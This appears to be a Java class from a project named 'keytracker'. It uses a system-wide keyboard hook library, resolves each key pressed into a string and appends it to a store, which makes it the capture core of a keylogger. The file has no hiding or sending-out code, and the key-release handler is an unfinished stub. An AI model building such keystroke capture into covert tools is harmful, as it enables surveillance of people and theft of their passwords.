package com.keytracker;

import de.ksquared.system.keyboard.KeyEvent;
import de.ksquared.system.keyboard.KeyListener;

public class KeyListenerImpl implements KeyListener {

    private final KeyResolver keyResolver;
    private final KeyAppender keyAppender;

    public KeyListenerImpl(KeyResolver keyResolver, KeyAppender keyAppender) {
        this.keyResolver = keyResolver;
        this.keyAppender = keyAppender;
    }

    @Override
    public void keyPressed(KeyEvent keyEvent) {
//        printKeyCode(keyEvent);
//        printAsciFrom("{}:\"|");

        String resolvedKey = keyResolver.resolve(keyEvent);
        keyAppender.append(resolvedKey);
    }

    @Override
    public void keyReleased(KeyEvent keyEvent) {
        //todo: implement ...
    }
}
